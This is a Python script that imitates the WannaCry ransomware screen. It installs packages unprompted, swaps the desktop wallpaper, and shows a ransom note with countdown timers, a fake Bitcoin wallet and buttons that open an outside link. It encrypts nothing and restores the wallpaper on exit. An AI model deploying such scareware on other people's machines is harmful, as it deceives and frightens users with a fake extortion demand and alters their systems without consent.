import subprocess,sys

def install(package):
    subprocess.check_call([sys.executable, "-m", "pip", "install", package])
install("pywin32")
install("pyperclip")
subprocess.check_call([sys.executable, "-m", "pip", "install", "pygame","--pre"])
import os,platform,ctypes,time,pygame,win32con,datetime,webbrowser,pyperclip

def newtextbox(screen,x,y,text,textcolor,background,textsize=15,alignment="left",font="arialbd.ttf",blit=True):
  font = pygame.font.Font(getresourceexactpath("\\" + font), textsize)
  txt = font.render(text, True, textcolor, background)
  posx = x
  if alignment == "center":
    posx = x - (txt.get_size()[0] / 2)
  if alignment == "left":
    posx = x
  if alignment == "right":
    posx = x - txt.get_size()[0]
  pos = (int(posx), int(y - (txt.get_size()[1] / 2)))
  if blit == True:
    screen.blit(txt, pos)
  return txt

global running,days,hours,minutes,seconds
pygame.init()
images = []
imagename = []
days = 3
hours = 0
minutes = 0
seconds = 0
fakewallet = "84ded1ea561d12336bc9a5e574914758"

def getimage(image):
    return images[imagename.index(image)]

def getWallpaper():
    ubuf = ctypes.create_unicode_buffer(512)
    ctypes.windll.user32.SystemParametersInfoW(win32con.SPI_GETDESKWALLPAPER,len(ubuf),ubuf,0)
    return ubuf.value

def convertpathtolinux(path):
  p = ""
  c = ""
  for char in path:
    c = char
    if c == "\\":
      c = "/"
    p += c
  return p


def getresourceexactpath(paff):
  if platform.system() == "Linux":
    return os.path.dirname(
      os.path.abspath(__file__)) + convertpathtolinux(paff)
  else:
    return os.path.dirname(os.path.abspath(__file__)) + paff

currentwallpaper = getWallpaper()
time.sleep(0)
ctypes.windll.user32.SystemParametersInfoW(20, 0, getresourceexactpath("\\oops.bmp") , 0)
disp = pygame.display.set_mode((810,585))
currentcount = datetime.datetime.now() + datetime.timedelta(days=10)
#load graphics
for image in os.listdir(getresourceexactpath("\\")):
  if image.endswith(".png"):
    images.append(
      pygame.image.load(getresourceexactpath("\\" +
                                             image)).convert_alpha())
    imagename.append(image)
pygame.display.set_caption("Wana Decrypt0r 2.0")
pygame.display.set_icon(getimage("decryptorlogo.png"))
localization = open(getresourceexactpath("\\english.txt")).readlines()
def makeransommessagesurf(data):
  surf = pygame.Surface((549,700))
  surf.fill((255,255,255))
  pos = 0
  offset = 6
  for v in data:
    text = v
    texsiz = 14
    color = (0,0,0)
    if text.startswith("<red>"):
      color = (255,0,0)
      text = text[5:len(text)]
    if text.startswith("<header>"):
      texsiz = 20
      text = text[8:len(text)]
    obj = newtextbox(surf,1,(5 * pos) + 15,text[0:len(text) - 1],color,None,font="cambria.ttc",blit=False,textsize=texsiz)
    surf.blit(obj,(1,(16.4 * pos) + offset))
    if v.startswith("<header>"):
      surf.blit(obj,(2,(16.4 * pos) + offset))
      offset += 10
    pos += 1
  return surf
ransomnote = makeransommessagesurf(localization)
running = True

def nineslice(size, image, edgesize):
  sliced = pygame.Surface(size, pygame.SRCALPHA)
  sliced.blit(image, (0, 0), (0, 0, edgesize, edgesize))
  sliced.blit(image,
              (sliced.get_width() - edgesize, sliced.get_height() - edgesize),
              (image.get_width() - edgesize, image.get_height() - edgesize,
               edgesize, edgesize))
  sliced.blit(image, (0, sliced.get_height() - edgesize),
              (0, image.get_height() - edgesize, edgesize, edgesize))
  sliced.blit(image, (sliced.get_width() - edgesize, 0),
              (image.get_width() - edgesize, 0, edgesize, edgesize))
  #middle
  middleslice = pygame.Surface((image.get_width() - (edgesize * 2), image.get_height() - (edgesize * 2)),pygame.SRCALPHA)
  middleslice.blit(image, (0, 0),(edgesize, edgesize, image.get_width() - edgesize,image.get_height() - (edgesize * 2)))
  sliced.blit(pygame.transform.scale(middleslice, (size[0] - (edgesize * 2), size[1] -(edgesize * 2))),(edgesize, edgesize))
  middleslice = pygame.Surface((image.get_width() - (edgesize * 2), image.get_height()), pygame.SRCALPHA)
  middleslice.blit(image, (0, 0), (edgesize, 0, image.get_width() -(edgesize * 2), image.get_height()))
  img = pygame.transform.scale(middleslice,(size[0] - (edgesize * 2), image.get_height()))
  sliced.blit(img, (edgesize, 0), (0, 0, img.get_width(), edgesize))
  sliced.blit(img, (edgesize, size[1] - edgesize),(0, img.get_height() - edgesize, img.get_width(), edgesize))

  middleslice = pygame.Surface((image.get_width(), image.get_height() - (edgesize * 2)), pygame.SRCALPHA)
  middleslice.blit(image, (0, 0),(0, edgesize, image.get_width(), image.get_height() -(edgesize * 2)))
  s = sliced.get_height() - (edgesize * 2)
  img = pygame.transform.scale(middleslice, (middleslice.get_width(), s))
  sliced.blit(img, (0, edgesize), (0, 0, edgesize, img.get_height()))
  sliced.blit(img, (size[0] - edgesize, edgesize),(img.get_width() - edgesize, 0, edgesize, img.get_height()))

  return sliced

def makecountdown(strig):
  font = getimage("font.png")
  surf = pygame.surface.Surface((len(strig) * 16,20))
  surf.fill((132,18,18))
  x = 0
  for v in strig:
    num = 10
    if v.isdigit():
      num = int(v)
    surf.blit(font,(x * 16,0),(num * 14,0,14,20))
    x += 1
  return surf

def timelogic():
  global running,days,hours,minutes,seconds
  while seconds <= 0:
    seconds += 60
    minutes -= 1
  while minutes <= 0:
    minutes += 60
    hours -= 1
  while hours <= 0:
    hours += 24
    days -= 1
  if days < 0:
    running = False
  
def fillzeros(ingeter,amt):
    ret = str(ingeter)
    for v in range(len(str(ingeter)),amt,1):
        ret = "0"+ret
    return ret

def getcollision(x, y, width, height):
  if x <= pygame.mouse.get_pos()[0] and x + width >= pygame.mouse.get_pos()[0]:
    if y <= pygame.mouse.get_pos()[1] and y + height >= pygame.mouse.get_pos(
    )[1]:
      return True
  return False
    
clock = pygame.time.Clock()
dt = 0
t = 0
ransomdrag = 0
draggingscroll = False
ransomy = 0
while running == True:
  dt = (float(pygame.time.get_ticks()) / 1000) - t
  t = pygame.time.get_ticks() / 1000
  seconds -= dt
  timelogic()
  for event in pygame.event.get():
    if event.type == pygame.QUIT:
        running = False
    elif event.type == pygame.MOUSEWHEEL:
        ransomy += event.y * 20
    elif event.type == pygame.MOUSEBUTTONDOWN:
        if event.button == 1:
          #draggingscroll = True
          #ransomdrag = 61 - (pygame.mouse.get_pos()[1] + ((ransomy * 0.6576819407)))
          if getcollision(27,486,62,11) or getcollision(27,516,99,11) or getcollision(27,546,78,15) or getcollision(241,547,268,30) or getcollision(541,547,268,30):
            webbrowser.open('https://r.mtdv.me/DjSOCSSONM')
          elif getcollision(771,492,31,34):
            pyperclip.copy(fakewallet)
            
    elif event.type == pygame.MOUSEBUTTONUP:
        if event.button == 1:
          draggingscroll = False
  if draggingscroll == True:
    ransomy = ransomdrag - ((pygame.mouse.get_pos()[1] / 0.6576819407) + 61)
  if ransomy < -170:
      ransomy = -170
  elif ransomy > 0:
      ransomy = 0
  disp.fill((255,255,255))
  disp.blit(ransomnote,(242,44 + ransomy))
  disp.blit(getimage("frame.png"),(0,0))
  disp.blit(getimage("lock.png"),(53,8))
  disp.blit(nineslice((569,77),getimage("roundbox9slice.png"),3),(240,458))
  disp.blit(nineslice((386,31),getimage("roundbox9slice2.png"),2),(381,494))
  disp.blit(getimage("btc.png"),(242,468))
  disp.blit(nineslice((224,145),getimage("roundbox9slice.png"),3),(9,305))
  disp.blit(nineslice((224,145),getimage("roundbox9slice.png"),3),(9,149))
  disp.blit(getimage("bar.png"),(212,185))
  disp.blit(getimage("bar.png"),(212,341))
  disp.blit(makecountdown(str(fillzeros(int(days),2))+":"+str(fillzeros(int(hours),2))+":"+str(fillzeros(int(minutes),2))+":"+str(fillzeros(int(seconds),2))),(23,252))
  disp.blit(makecountdown(str(fillzeros(int(days + 4),2))+":"+str(fillzeros(int(hours),2))+":"+str(fillzeros(int(minutes),2))+":"+str(fillzeros(int(seconds),2))),(23,408))
  disp.blit(nineslice((268,30),getimage("btn9slice.png"),10),(541,547))
  disp.blit(nineslice((268,30),getimage("btn9slice.png"),10),(241,547))
  disp.blit(nineslice((31,34),getimage("btn9slice.png"),10),(771,492))
  textbox = newtextbox(disp,387,467,str(fillzeros(currentcount.month,2))+"/"+str(fillzeros(currentcount.day + 3,2))+"/"+str(currentcount.year)+" "+fillzeros(currentcount.hour,2)+":"+fillzeros(currentcount.minute,2)+":"+fillzeros(currentcount.second,2),(255,255,255),None,textsize=15,blit=False,font="arial.ttf")
  disp.blit(textbox,(55,195))
  disp.blit(textbox,(56,195))
  textbox2 = newtextbox(disp,387,467,str(fillzeros(currentcount.month,2))+"/"+str(fillzeros(currentcount.day + 7,2))+"/"+str(currentcount.year)+" "+fillzeros(currentcount.hour,2)+":"+fillzeros(currentcount.minute,2)+":"+fillzeros(currentcount.second,2),(255,255,255),None,textsize=15,blit=False,font="arial.ttf")
  disp.blit(textbox2,(55,352))
  disp.blit(textbox2,(56,352))
  disp.blit(getimage("nonchanging.png"),(0,0))
  newtextbox(disp,381 + 6,494 + 12,fakewallet,(255,255,255),None,textsize=15)
  newtextbox(disp,241 + 134,547 + 15,"Check Payment",(0,0,0),None,textsize=15,alignment="center")
  newtextbox(disp,541 + 134,547 + 15,"Decrypt",(0,0,0),None,textsize=15,alignment="center")
  disp.fill((205,205,205),(792,61 - (ransomy * 0.6576819407),15,259))
  pygame.display.flip()
ctypes.windll.user32.SystemParametersInfoW(20, 0, currentwallpaper , 0)